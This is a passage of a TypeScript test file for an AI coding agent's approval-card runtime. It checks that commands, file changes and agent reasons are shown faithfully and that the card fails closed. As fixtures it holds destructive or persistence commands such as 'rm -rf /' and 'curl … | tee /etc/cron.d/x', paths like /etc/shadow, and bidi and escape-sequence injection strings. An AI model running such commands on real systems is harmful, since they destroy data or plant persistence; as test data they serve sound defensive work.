  it('⚑ 709 control · a command escalated WITHOUT a justification carries no `agentReason` at all', async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    transport.serverRequest(61, 'item/commandExecution/requestApproval', {
      command: 'rm -rf build',
      cwd: '/tmp/x',
      proposedExecpolicyAmendment: ['rm', '-rf', 'build'],
    })
    await vi.waitFor(has(events, (e) => e.type === 'permission_request'))
    expect('agentReason' in scopeOf(events)).toBe(false)
    await handle.close()
    await consumer
  })

  it('⛔ 709 · the agent’s words are CLEANED like the provider’s, never reworded — and dropped past the ceiling', async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    transport.serverRequest(62, 'item/commandExecution/requestApproval', {
      command: 'rm -rf build',
      cwd: '/tmp/x',
      proposedExecpolicyAmendment: ['rm', '-rf', 'build'],
      reason: '\u001b[1mClean\u001b[0m the\u202e build\n folder?',
    })
    transport.serverRequest(63, 'item/commandExecution/requestApproval', {
      command: 'rm -rf dist',
      cwd: '/tmp/x',
      proposedExecpolicyAmendment: ['rm', '-rf', 'dist'],
      reason: 'x'.repeat(MAX_PERMISSION_DETAIL_CHARS + 1),
    })
    await vi.waitFor(() =>
      expect(events.filter((e) => e.type === 'permission_request')).toHaveLength(2),
    )
    const [cleaned, tooLong] = events.filter(
      (e): e is Extract<RuntimeEvent, { type: 'permission_request' }> =>
        e.type === 'permission_request',
    )
    expect(cleaned?.agentReason).toBe('Clean the build folder?')
    expect(tooLong !== undefined && 'agentReason' in tooLong).toBe(false)
    await handle.close()
    await consumer
  })

  it('an item from a FINISHED turn cannot put paths on the live turn’s card (181)', async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    transport.notification(
      'turn/completed',
      turnCompletedNotification('th_1', completedTurn('tn_1')),
    )
    await vi.waitFor(() => expect(events.filter((e) => e.type === 'turn').length).toBe(1))
    await handle.send('two')
    transport.notification('item/started', {
      ...fileItem('it_11', [{ path: '/w/stale.txt', kind: { type: 'add' }, diff: '@@' }]),
      turnId: 'tn_1',
    })
    await new Promise((resolve) => setTimeout(resolve, 30))
    transport.serverRequest(59, 'item/fileChange/requestApproval', {
      threadId: 'th_1',
      turnId: 'tn_2',
      itemId: 'it_11',
      startedAtMs: 0,
    })
    await vi.waitFor(has(events, (e) => e.type === 'permission_request'))
    const req = scopeOf(events)
    expect(req.scope.paths).toEqual([])
    expect(req.detail).not.toContain('stale.txt')
    expect(req.scope.underDisclosed, 'and it says so rather than showing an empty list').toBe(true)
    await handle.close()
    await consumer
  })

  const cardFor = (events: RuntimeEvent[], id: string) => {
    const p = events.find((e) => e.type === 'permission_request' && e.id === id)
    if (!p || p.type !== 'permission_request') throw new Error(`no permission_request ${id}`)
    return p
  }

  const patchUpdated = (
    itemId: string,
    changes: unknown[],
    ids: { threadId?: string; turnId?: string } = {},
  ): Record<string, unknown> => ({
    threadId: 'th_1',
    turnId: 'tn_1',
    ...ids,
    itemId,
    changes,
  })

  describe('⛔ a card that names the wrong file (184, from 182 H3)', () => {
    it('a foreign or stale patchUpdated cannot move the live card off its file', async () => {
      const { transport, handle, events, consumer } = await startCodexInTurn()
      transport.notification(
        'item/started',
        fileItem('it_12', [{ path: '/etc/hosts', kind: { type: 'update' }, diff: '@@' }]),
      )
      await vi.waitFor(has(events, (e) => e.type === 'tool_call'))
      transport.notification(
        'item/fileChange/patchUpdated',
        patchUpdated('it_12', [{ path: '/w/benign.txt', kind: { type: 'add' } }], {
          threadId: 'th_child',
        }),
      )
      transport.notification(
        'item/fileChange/patchUpdated',
        patchUpdated('it_12', [{ path: '/w/benign.txt', kind: { type: 'add' } }], {
          turnId: 'tn_0',
        }),
      )
      await new Promise((resolve) => setTimeout(resolve, 30))
      transport.serverRequest(101, 'item/fileChange/requestApproval', {
        threadId: 'th_1',
        turnId: 'tn_1',
        itemId: 'it_12',
        startedAtMs: 0,
      })
      await vi.waitFor(has(events, (e) => e.type === 'permission_request'))
      const req = cardFor(events, 'number:101')
      expect(req.detail, 'the card still names what Approve actually writes').toBe(
        'modified /etc/hosts',
      )
      expect(req.detail).not.toContain('benign')
      expect(req.scope.paths).toEqual(['/etc/hosts'])
      expect(req.scope.underDisclosed, 'and the claim of full disclosure is still true').toBe(false)
      await handle.close()
      await consumer
    })

    it('…but the ACTIVE item’s own later frame still replaces the answer', async () => {
      const { transport, handle, events, consumer } = await startCodexInTurn()
      transport.notification(
        'item/started',
        fileItem('it_13', [{ path: '/w/first.txt', kind: { type: 'add' }, diff: '@@' }]),
      )
      await vi.waitFor(has(events, (e) => e.type === 'tool_call'))
      transport.notification(
        'item/fileChange/patchUpdated',
        patchUpdated('it_13', [
          { path: '/w/first.txt', kind: { type: 'add' } },
          { path: '/w/second.txt', kind: { type: 'delete' } },
        ]),
      )
      await new Promise((resolve) => setTimeout(resolve, 30))
      transport.serverRequest(102, 'item/fileChange/requestApproval', {
        threadId: 'th_1',
        turnId: 'tn_1',
        itemId: 'it_13',
        startedAtMs: 0,
      })
      await vi.waitFor(has(events, (e) => e.type === 'permission_request'))
      const req = cardFor(events, 'number:102')
      expect(req.detail.split('\n')).toEqual(['added /w/first.txt', 'deleted /w/second.txt'])
      expect(req.scope.underDisclosed).toBe(false)
      await handle.close()
      await consumer
    })

    it('an id reused by a LATER turn does not inherit the earlier turn’s files', async () => {
      const { transport, handle, events, consumer } = await startCodexInTurn()
      transport.notification(
        'item/started',
        fileItem('it_14', [{ path: '/etc/shadow', kind: { type: 'delete' }, diff: '@@' }]),
      )
      await vi.waitFor(has(events, (e) => e.type === 'tool_call'))
      transport.serverRequest(103, 'item/fileChange/requestApproval', {
        threadId: 'th_1',
        turnId: 'tn_1',
        itemId: 'it_14',
        startedAtMs: 0,
      })
      await vi.waitFor(has(events, (e) => e.type === 'permission_request'))
      expect(cardFor(events, 'number:103').detail).toBe('deleted /etc/shadow')
      await handle.respondPermission('number:103', { outcome: 'allow' })
      transport.notification(
        'turn/completed',
        turnCompletedNotification('th_1', completedTurn('tn_1')),
      )
      await vi.waitFor(() => expect(events.filter((e) => e.type === 'turn').length).toBe(1))
      await handle.send('two')
      transport.serverRequest(104, 'item/fileChange/requestApproval', {
        threadId: 'th_1',
        turnId: 'tn_2',
        itemId: 'it_14',
        startedAtMs: 0,
      })
      await vi.waitFor(has(events, (e) => e.type === 'permission_request' && e.id === 'number:104'))
      const stale = cardFor(events, 'number:104')
      expect(stale.detail, 'this turn was told nothing, and the card says so').not.toContain(
        'shadow',
      )
      expect(stale.scope.paths).toEqual([])
      expect(stale.scope.underDisclosed).toBe(true)
      await handle.close()
      await consumer
    })

    it('foreign frames cannot fill the tracker and evict the live turn’s entry', async () => {
      const { transport, handle, events, consumer } = await startCodexInTurn()
      transport.notification(
        'item/started',
        fileItem('it_15', [{ path: '/etc/hosts', kind: { type: 'update' }, diff: '@@' }]),
      )
      await vi.waitFor(has(events, (e) => e.type === 'tool_call'))
      for (let i = 0; i < 70; i += 1) {
        transport.notification(
          'item/fileChange/patchUpdated',
          patchUpdated(`foreign-${i}`, [{ path: `/w/${i}.txt`, kind: { type: 'add' } }], {
            threadId: 'th_child',
          }),
        )
      }
      await new Promise((resolve) => setTimeout(resolve, 30))
      transport.serverRequest(105, 'item/fileChange/requestApproval', {
        threadId: 'th_1',
        turnId: 'tn_1',
        itemId: 'it_15',
        startedAtMs: 0,
      })
      await vi.waitFor(has(events, (e) => e.type === 'permission_request'))
      expect(cardFor(events, 'number:105').detail).toBe('modified /etc/hosts')
      expect(cardFor(events, 'number:105').scope.underDisclosed).toBe(false)
      await handle.close()
      await consumer
    })
  })

  it('always allows a cancel (turn-kill) even when the request omits it', async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    transport.serverRequest(56, 'item/commandExecution/requestApproval', {
      ...commandParams,
      availableDecisions: ['accept', 'decline'],
    })
    await vi.waitFor(has(events, (e) => e.type === 'permission_request'))
    await handle.respondPermission('number:56', { outcome: 'cancel' })
    await vi.waitFor(() => expect(transport.responses.some((r) => r.id === 56)).toBe(true))
    await handle.close()
    await consumer
  })

  it('🔴 every published offer keeps both refusals, and only four of six can be allowed (487)', async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    const publishedBy = async (
      id: number,
      method: string,
      params: Record<string, unknown>,
    ): Promise<{ offer: PermissionOutcome[]; because: string | undefined }> => {
      transport.serverRequest(id, method, params)
      await vi.waitFor(() =>
        expect(events.some((e) => e.type === 'permission_request' && e.id === `number:${id}`)).toBe(
          true,
        ),
      )
      const card = events.find(
        (e): e is Extract<RuntimeEvent, { type: 'permission_request' }> =>
          e.type === 'permission_request' && e.id === `number:${id}`,
      )
      if (card === undefined) throw new Error(`no card for number:${id}`)
      return { offer: card.scope.availableDecisions, because: card.scope.noPositiveBecause }
    }
    const COMMAND = 'item/commandExecution/requestApproval'
    const UNDISPLAYABLE = {
      network: { enabled: false },
      fileSystem: {
        read: null,
        write: null,
        entries: [
          { path: { type: 'special', value: { kind: 'unknown', path: '/???' } }, access: 'write' },
        ],
      },
    }

    expect(
      await publishedBy(70, COMMAND, {
        ...commandParams,
        availableDecisions: ['accept', 'decline'],
      }),
    ).toEqual({ offer: ['allow', 'deny', 'cancel'], because: undefined })

    expect(await publishedBy(71, COMMAND, { ...commandParams, availableDecisions: [] })).toEqual({
      offer: ['deny', 'cancel'],
      because: 'none-was-offered',
    })

    expect(
      await publishedBy(74, COMMAND, {
        ...commandParams,
        availableDecisions: [{ acceptWithExecpolicyAmendment: { rules: ['curl *'] } }],
      }),
    ).toEqual({ offer: ['deny', 'cancel'], because: 'could-not-represent-the-answers' })

    expect(
      await publishedBy(75, COMMAND, {
        ...commandParams,
        availableDecisions: ['accept', 'decline'],
        additionalPermissions: UNDISPLAYABLE,
      }),
    ).toEqual({ offer: ['deny', 'cancel'], because: 'could-not-describe-the-grant' })

    const noList: Record<string, unknown> = { ...commandParams }
    delete noList['availableDecisions']
    expect(await publishedBy(72, COMMAND, noList)).toEqual({
      offer: ['allow', 'allow_for_session', 'deny', 'cancel'],
      because: undefined,
    })

    expect(
      await publishedBy(73, 'item/fileChange/requestApproval', {
        threadId: 'th_1',
        turnId: 'tn_1',
        itemId: 'it_9',
        startedAtMs: 0,
        reason: 'apply patch',
      }),
    ).toEqual({ offer: ['allow', 'allow_for_session', 'deny', 'cancel'], because: undefined })

    const published = events.filter(
      (e): e is Extract<RuntimeEvent, { type: 'permission_request' }> =>
        e.type === 'permission_request',
    )
    expect(published.length).toBe(6)
    for (const card of published) {
      for (const refusal of ALWAYS_HONOURED) {
        expect(
          card.scope.availableDecisions,
          `${card.id} published an offer without ${refusal}`,
        ).toContain(refusal)
      }
      const canBeAllowed = card.scope.availableDecisions.some(
        (outcome) => !isAlwaysHonoured(outcome),
      )
      expect(card.scope.noPositiveBecause === undefined, `${card.id} said the wrong thing`).toBe(
        canBeAllowed,
      )
    }

    await handle.close()
    await consumer
  })

  it('⚠️ an unreadable token is described as unreadable, never as an accept (487)', async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    transport.serverRequest(76, 'item/commandExecution/requestApproval', {
      ...commandParams,
      availableDecisions: ['decline', 'cancel', 'somethingThisAppCannotRead'],
    })
    await vi.waitFor(() =>
      expect(events.some((e) => e.type === 'permission_request' && e.id === 'number:76')).toBe(
        true,
      ),
    )
    const card = events.find(
      (e): e is Extract<RuntimeEvent, { type: 'permission_request' }> =>
        e.type === 'permission_request' && e.id === 'number:76',
    )
    expect(card?.scope.availableDecisions).toEqual(['deny', 'cancel'])
    expect(card?.scope.noPositiveBecause).toBe('could-not-represent-the-answers')
    await handle.close()
    await consumer
  })

  it('🔴 every undisplayable shape publishes ONE answer, and it names none of them (487)', async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    const UNKNOWN_PATH = {
      path: { type: 'special', value: { kind: 'unknown', path: '/???' } },
      access: 'write',
    }
    const UNDISPLAYABLE: Record<string, unknown> = {
      'not a record at all': 'everything',
      'an array, which isRecord accepts': ['read'],
      'an unrecognised top-level key': { fileSystem: { read: ['/a'] }, scopes: 1 },
      'a network that is not a record': { network: true },
      'an unrecognised network key': { network: { enabled: true, allowedHosts: ['x'] } },
      'a fileSystem that is not a record': { fileSystem: 'everything' },
      'an unrecognised fileSystem key': { fileSystem: { read: ['/a'], sockets: [] } },
      'a read that is not an array': { fileSystem: { read: '/a' } },
      'a path element that is not a string': { fileSystem: { read: [7] } },
      'entries that are not an array': { fileSystem: { entries: {} } },
      'an entry we have no label for': { fileSystem: { entries: [UNKNOWN_PATH] } },
    }

    const published = new Map<
      string,
      { scope: Omit<PermissionScope, 'paths'>; pathsLength: number }
    >()
    let id = 80
    for (const [name, additionalPermissions] of Object.entries(UNDISPLAYABLE)) {
      id += 1
      transport.serverRequest(id, 'item/commandExecution/requestApproval', {
        command: 'setup',
        cwd: '/tmp/x',
        availableDecisions: ['accept', 'decline'],
        additionalPermissions,
      })
      const at = `number:${id}`
      await vi.waitFor(() =>
        expect(events.some((e) => e.type === 'permission_request' && e.id === at)).toBe(true),
      )
      const card = events.find(
        (e): e is Extract<RuntimeEvent, { type: 'permission_request' }> =>
          e.type === 'permission_request' && e.id === at,
      )
      if (card === undefined) throw new Error(`no card for ${at}`)
      const { paths, ...rest } = card.scope
      published.set(name, { scope: rest, pathsLength: paths.length })
    }

    const one = {
      scope: {
        cwd: '/tmp/x',
        networkHosts: [],
        persistence: 'once',
        amendments: [],
        availableDecisions: ['deny', 'cancel'],
        noPositiveBecause: 'could-not-describe-the-grant',
        underDisclosed: true,
        approvalMode: 'ask',
      },
      pathsLength: 0,
    }
    const LABELS_PUBLISHED: Readonly<Record<string, number>> = {
      'an unrecognised top-level key': 1,
      'an unrecognised fileSystem key': 1,
    }
    expect(Object.fromEntries(published)).toEqual(
      Object.fromEntries(
        Object.keys(UNDISPLAYABLE).map((name) => [
          name,
          { ...one, pathsLength: LABELS_PUBLISHED[name] ?? 0 },
        ]),
      ),
    )
    for (const [name, row] of published) {
      expect(row.scope.availableDecisions, name).toEqual(['deny', 'cancel'])
      expect(row.scope.noPositiveBecause, name).toBe('could-not-describe-the-grant')
    }

    transport.serverRequest(99, 'item/commandExecution/requestApproval', {
      command: 'setup',
      cwd: '/tmp/x',
      availableDecisions: ['accept', 'decline'],
      additionalPermissions: { fileSystem: { read: ['/a'] }, network: { enabled: true } },
    })
    await vi.waitFor(() =>
      expect(events.some((e) => e.type === 'permission_request' && e.id === 'number:99')).toBe(
        true,
      ),
    )
    const shown = events.find(
      (e): e is Extract<RuntimeEvent, { type: 'permission_request' }> =>
        e.type === 'permission_request' && e.id === 'number:99',
    )
    expect(shown?.scope.availableDecisions).toEqual(['allow', 'deny', 'cancel'])
    expect(shown?.scope.noPositiveBecause).toBeUndefined()

    await handle.close()
    await consumer
  })

  it('does NOT leak the raw provider payload into the neutral event', async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    transport.serverRequest(51, 'item/commandExecution/requestApproval', commandParams)
    await vi.waitFor(has(events, (e) => e.type === 'permission_request'))
    const req = scopeOf(events)
    expect(new Set(Object.keys(req))).toEqual(
      new Set(['type', 'id', 'kind', 'action', 'detail', 'scope']),
    )
    const serialized = JSON.stringify(req)
    for (const leak of [
      'threadId',
      'turnId',
      'itemId',
      'startedAtMs',
      'commandActions',
      'networkApprovalContext',
      'additionalPermissions',
    ]) {
      expect(serialized).not.toContain(leak)
    }
    await handle.close()
    await consumer
  })

  it('maps a file approval grant root to a session-wide scope', async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    transport.serverRequest(52, 'item/fileChange/requestApproval', {
      threadId: 'th_1',
      turnId: 'tn_1',
      itemId: 'it_2',
      startedAtMs: 0,
      reason: 'apply patch',
      grantRoot: '/tmp/x/src',
    })
    await vi.waitFor(has(events, (e) => e.type === 'permission_request'))
    const req = scopeOf(events)
    expect(req.kind).toBe('file')
    expect(req.scope).toMatchObject({
      grantRoot: '/tmp/x/src',
      persistence: 'session',
      paths: ['/tmp/x/src'],
    })
    await handle.close()
    await consumer
  })

  it('697 · a file card with no grant root says what its session button can grant', async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    transport.serverRequest(55, 'item/fileChange/requestApproval', {
      threadId: 'th_1',
      turnId: 'tn_1',
      itemId: 'it_3',
      startedAtMs: 0,
      reason: 'apply patch',
    })
    await vi.waitFor(has(events, (e) => e.type === 'permission_request'))
    const req = scopeOf(events)
    expect(req.kind).toBe('file')
    expect(req.scope.availableDecisions).toContain('allow_for_session')
    expect(req.scope.grantRoot).toBeUndefined()
    expect(req.scope.persistence).toBe('session')
    await handle.close()
    await consumer
  })

  it('rejects a respondPermission decision the request does not offer', async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    transport.serverRequest(53, 'item/commandExecution/requestApproval', {
      ...commandParams,
      availableDecisions: ['decline', 'cancel'],
    })
    await vi.waitFor(has(events, (e) => e.type === 'permission_request'))
    await expect(handle.respondPermission('number:53', { outcome: 'allow' })).rejects.toThrow(
      /not offered/,
    )
    await handle.respondPermission('number:53', { outcome: 'deny' })
    await vi.waitFor(() => expect(transport.responses.some((r) => r.id === 53)).toBe(true))
    await handle.close()
    await consumer
  })

  it('an explicit list with a mix of amendment-form + decline surfaces ONLY the representable set, no invented allow (023 P1-F)', async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    transport.serverRequest(60, 'item/commandExecution/requestApproval', {
      command: 'curl http://x',
      cwd: '/tmp/x',
      availableDecisions: [{ acceptWithExecpolicyAmendment: { rules: ['curl *'] } }, 'decline'],
      proposedExecpolicyAmendment: ['curl', '*'],
    })
    await vi.waitFor(has(events, (e) => e.type === 'permission_request'))
    const req = scopeOf(events)
    expect(req.scope.availableDecisions).toEqual(['deny', 'cancel'])
    expect(req.scope.noPositiveBecause).toBe('could-not-represent-the-answers')
    expect(req.scope.underDisclosed).toBe(true)
    expect(req.scope.amendments).toContainEqual({ kind: 'exec', detail: 'curl *' })
    await expect(handle.respondPermission('number:60', { outcome: 'allow' })).rejects.toThrow(
      /not offered/,
    )
    expect(transport.responses.some((r) => r.id === 60)).toBe(false)
    await handle.close()
    await consumer
  })

  it('an explicit list with ONLY an amendment-form accept yields NO WAY TO ALLOW, says why, and fails closed (023 P1-F · 487)', async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    transport.serverRequest(61, 'item/commandExecution/requestApproval', {
      command: 'curl http://x',
      cwd: '/tmp/x',
      availableDecisions: [{ acceptWithExecpolicyAmendment: { rules: ['curl *'] } }],
      proposedExecpolicyAmendment: ['curl', '*'],
    })
    await vi.waitFor(has(events, (e) => e.type === 'permission_request'))
    const req = scopeOf(events)
    expect(req.scope.availableDecisions).toEqual(['deny', 'cancel'])
    expect(req.scope.noPositiveBecause).toBe('could-not-represent-the-answers')
    expect(req.scope.underDisclosed).toBe(true)
    await expect(handle.respondPermission('number:61', { outcome: 'allow' })).rejects.toThrow(
      /not offered/,
    )
    await expect(
      handle.respondPermission('number:61', { outcome: 'allow_for_session' }),
    ).rejects.toThrow(/not offered/)
    await expect(
      handle.respondPermission('number:61', { outcome: 'allow_always' }),
    ).rejects.toThrow(/not offered/)
    expect(transport.responses.some((r) => r.id === 61)).toBe(false)
    await handle.respondPermission('number:61', { outcome: 'cancel' })
    await vi.waitFor(() => expect(transport.responses.some((r) => r.id === 61)).toBe(true))
    await handle.close()
    await consumer
  })

  it('an explicit EMPTY availableDecisions:[] offers no way to ALLOW — no positive decision reaches the wire (036 P1-F #3 · 487)', async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    transport.serverRequest(62, 'item/commandExecution/requestApproval', {
      command: 'rm -rf /',
      cwd: '/tmp/x',
      availableDecisions: [],
    })
    await vi.waitFor(has(events, (e) => e.type === 'permission_request'))
    const req = scopeOf(events)
    expect(req.scope.availableDecisions).toEqual(['deny', 'cancel'])
    expect(req.scope.noPositiveBecause).toBe('none-was-offered')
    expect(req.scope.underDisclosed).toBe(false)
    await expect(handle.respondPermission('number:62', { outcome: 'allow' })).rejects.toThrow(
      /not offered/,
    )
    await expect(
      handle.respondPermission('number:62', { outcome: 'allow_for_session' }),
    ).rejects.toThrow(/not offered/)
    expect(transport.responses.some((r) => r.id === 62)).toBe(false)
    await handle.respondPermission('number:62', { outcome: 'deny' })
    await vi.waitFor(() => expect(transport.responses.some((r) => r.id === 62)).toBe(true))
    await handle.close()
    await consumer
  })

  it('a command with nothing picked out of it is disclosed by the command itself, which the card shows whole', async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    transport.serverRequest(63, 'item/commandExecution/requestApproval', {
      command: 'curl https://api.example | tee /etc/cron.d/x',
      cwd: '/tmp/x',
      availableDecisions: ['accept', 'decline'],
    })
    await vi.waitFor(has(events, (e) => e.type === 'permission_request'))
    const req = scopeOf(events)
    expect(req.scope.underDisclosed).toBe(false)
    expect(req.detail).toBe('curl https://api.example | tee /etc/cron.d/x')
    expect(req.scope.paths).toEqual([])
    expect(req.scope.networkHosts).toEqual([])
    await handle.close()
    await consumer
  })

  it('a command requesting filesystem entries DISCLOSES them access-labelled (path/glob/special) (036 P1-F #5)', async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    transport.serverRequest(64, 'item/commandExecution/requestApproval', {
      command: 'setup',
      cwd: '/tmp/x',
      availableDecisions: ['accept', 'decline'],
      additionalPermissions: {
        network: { enabled: false },
        fileSystem: {
          read: null,
          write: ['/tmp/x/legacy'],
          entries: [
            { path: { type: 'path', path: '/etc' }, access: 'write' },
            { path: { type: 'glob_pattern', pattern: '**/*.ts' }, access: 'read' },
            { path: { type: 'special', value: { kind: 'tmpdir' } }, access: 'write' },
          ],
        },
      },
    })
    await vi.waitFor(has(events, (e) => e.type === 'permission_request'))
    const req = scopeOf(events)
    expect(req.scope.paths).toEqual([
      'write /tmp/x/legacy',
      'write /etc',
      'read glob:**/*.ts',
      'write special:tmpdir',
    ])
    expect(req.scope.underDisclosed).toBe(true)
    await handle.respondPermission('number:64', { outcome: 'allow' })
    await vi.waitFor(() => expect(transport.responses.some((r) => r.id === 64)).toBe(true))
    expect(transport.responses.find((r) => r.id === 64)?.result).toEqual({ decision: 'accept' })
    await handle.close()
    await consumer
  })

  it('a command whose requested permissions are NOT displayable fails positives closed (036 P1-F #5)', async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    transport.serverRequest(65, 'item/commandExecution/requestApproval', {
      command: 'setup',
      cwd: '/tmp/x',
      availableDecisions: ['accept', 'decline'],
      additionalPermissions: {
        network: { enabled: false },
        fileSystem: {
          read: null,
          write: null,
          entries: [
            {
              path: { type: 'special', value: { kind: 'unknown', path: '/???', subpath: null } },
              access: 'write',
            },
          ],
        },
      },
    })
    await vi.waitFor(has(events, (e) => e.type === 'permission_request'))
    expect(scopeOf(events).scope.underDisclosed).toBe(true)
    expect(scopeOf(events).scope.availableDecisions).toEqual(['deny', 'cancel'])
    expect(scopeOf(events).scope.noPositiveBecause).toBe('could-not-describe-the-grant')
    await expect(handle.respondPermission('number:65', { outcome: 'allow' })).rejects.toThrow(
      /not offered/,
    )
    expect(transport.responses.some((r) => r.id === 65)).toBe(false)
    await handle.respondPermission('number:65', { outcome: 'deny' })
    await vi.waitFor(() => expect(transport.responses.some((r) => r.id === 65)).toBe(true))
    await handle.close()
    await consumer
  })

  it('an ABSENT decision list combined with undisplayable permissions still blocks positives (widening must not defeat fail-closed)', async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    transport.serverRequest(66, 'item/commandExecution/requestApproval', {
      command: 'setup',
      cwd: '/tmp/x',
      additionalPermissions: {
        network: { enabled: false },
        fileSystem: {
          read: null,
          write: null,
          entries: [
            {
              path: { type: 'special', value: { kind: 'unknown', path: '/???', subpath: null } },
              access: 'write',
            },
          ],
        },
      },
    })
    await vi.waitFor(has(events, (e) => e.type === 'permission_request'))
    expect(scopeOf(events).scope.availableDecisions).toEqual(['deny', 'cancel'])
    expect(scopeOf(events).scope.noPositiveBecause).toBe('could-not-describe-the-grant')
    expect(scopeOf(events).scope.underDisclosed).toBe(true)
    await expect(handle.respondPermission('number:66', { outcome: 'allow' })).rejects.toThrow(
      /not offered/,
    )
    await expect(
      handle.respondPermission('number:66', { outcome: 'allow_for_session' }),
    ).rejects.toThrow(/not offered/)
    expect(transport.responses.some((r) => r.id === 66)).toBe(false)
    await handle.respondPermission('number:66', { outcome: 'cancel' })
    await vi.waitFor(() => expect(transport.responses.some((r) => r.id === 66)).toBe(true))
    await handle.close()
    await consumer
  })

  it('a sandbox DENY entry is disclosed as a RESTRICTION, not as a granted path', async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    transport.serverRequest(67, 'item/commandExecution/requestApproval', {
      command: 'setup',
      cwd: '/tmp/x',
      availableDecisions: ['accept', 'decline'],
      additionalPermissions: {
        network: { enabled: false },
        fileSystem: {
          read: null,
          write: null,
          entries: [
            { path: { type: 'path', path: '/work' }, access: 'write' },
            { path: { type: 'path', path: '/etc' }, access: 'deny' },
          ],
        },
      },
    })
    await vi.waitFor(has(events, (e) => e.type === 'permission_request'))
    expect(scopeOf(events).scope.paths).toEqual(['write /work', 'restrict /etc'])
    await handle.close()
    await consumer
  })
})

describe('CodexRuntime — user-input requests (007 P2-1)', () => {
  const questionParams = {
    threadId: 'th_1',
    turnId: 'tn_1',
    itemId: 'it_1',
    questions: [
      {
        id: 'q_color',
        header: 'Color',
        question: 'pick a color',
        isOther: false,
        isSecret: false,
        options: [{ label: 'blue', description: '' }],
      },
    ],
    autoResolutionMs: null,
  }
  const permParams = {
    threadId: 'th_1',
    turnId: 'tn_1',
    itemId: 'it_2',
    environmentId: null,
    startedAtMs: 0,
    cwd: '/tmp/x',
    reason: 'needs write',
    permissions: { network: { enabled: true }, fileSystem: { read: null, write: ['/tmp/x/out'] } },
  }
  const resultFor = (transport: FakeTransport, id: number) =>
    transport.responses.find((r) => r.id === id)?.result

  it('requestUserInput → user_input_request(questions); answer → answers-by-questionId (no {answer})', async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    transport.serverRequest(80, 'item/tool/requestUserInput', questionParams)
    await vi.waitFor(has(events, (e) => e.type === 'user_input_request'))
    const req = firstOfType(events, 'user_input_request')
    expect(req.questions).toEqual([
      {
        id: 'q_color',
        prompt: 'pick a color',
        header: 'Color',
        options: [{ label: 'blue' }],
        allowOther: false,
        secret: false,
        multiSelect: false,
      },
    ])
    expect(Object.keys(req)).not.toContain('raw')
    await handle.respondUserInput('number:80', { kind: 'answer', answers: { q_color: 'blue' } })
    await vi.waitFor(() => expect(transport.responses.some((r) => r.id === 80)).toBe(true))
    expect(resultFor(transport, 80)).toEqual({ answers: { q_color: { answers: ['blue'] } } })
    await handle.close()
    await consumer
  })

  it('a Codex question is single-select even when the params carry a flag we do not model', async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    transport.serverRequest(88, 'item/tool/requestUserInput', {
      ...questionParams,
      questions: [{ ...questionParams.questions[0], multiSelect: true }],
    })
    await vi.waitFor(has(events, (e) => e.type === 'user_input_request'))
    expect(firstOfType(events, 'user_input_request').questions[0]?.multiSelect).toBe(false)

    await handle.respondUserInput('number:88', { kind: 'answer', answers: { q_color: 'blue' } })
    await vi.waitFor(() => expect(transport.responses.some((r) => r.id === 88)).toBe(true))
    expect(resultFor(transport, 88)).toEqual({ answers: { q_color: { answers: ['blue'] } } })
    await handle.close()
    await consumer
  })

  it('requestUserInput decline → documented {answers:{}} payload, never a JSON-RPC error', async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    transport.serverRequest(81, 'item/tool/requestUserInput', questionParams)
    await vi.waitFor(has(events, (e) => e.type === 'user_input_request'))
    await handle.respondUserInput('number:81', { kind: 'reject' })
    await vi.waitFor(() => expect(transport.responses.some((r) => r.id === 81)).toBe(true))
    expect(resultFor(transport, 81)).toEqual({ answers: {} })
    expect(transport.errors.some((e) => e.id === 81)).toBe(false)
    await handle.close()
    await consumer
  })

  it('⚠️ a decline’s reason is not sent to Codex: its answer has no place for one', async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    transport.serverRequest(181, 'item/tool/requestUserInput', questionParams)
    await vi.waitFor(has(events, (e) => e.type === 'user_input_request'))
    await handle.respondUserInput('number:181', { kind: 'reject', reason: 'I do not know' })
    await vi.waitFor(() => expect(transport.responses.some((r) => r.id === 181)).toBe(true))
    expect(resultFor(transport, 181)).toEqual({ answers: {} })
    await handle.close()
    await consumer
  })

  it('permissions requestApproval → user_input_request(permission scope); answer → {permissions,scope}', async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    transport.serverRequest(82, 'item/permissions/requestApproval', permParams)
    await vi.waitFor(has(events, (e) => e.type === 'user_input_request'))
    const req = firstOfType(events, 'user_input_request')
    expect(req.questions).toEqual([])
    expect(req.permission).toEqual({
      cwd: '/tmp/x',
      agentReason: 'needs write',
      paths: ['write /tmp/x/out'],
      network: true,
    })
    expect(req.prompt).toBe(THE_AGENT_ASKS_FOR_ACCESS)
    expect(
      JSON.stringify({ ...req, permission: { ...req.permission, agentReason: null } }),
    ).not.toContain('needs write')
    expect(Object.keys(req)).not.toContain('raw')
    await handle.respondUserInput('number:82', { kind: 'answer', answers: {} })
    await vi.waitFor(() => expect(transport.responses.some((r) => r.id === 82)).toBe(true))
    expect(resultFor(transport, 82)).toEqual({ permissions: permParams.permissions, scope: 'turn' })
    await handle.close()
    await consumer
  })

  it('⛔ 709 · a permissions card’s agent words are CLEANED like a command card’s — and dropped past the ceiling', async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    transport.serverRequest(88, 'item/permissions/requestApproval', {
      ...permParams,
      reason: '\u001b[1mneeds\u001b[0m\u202e write\n access',
    })
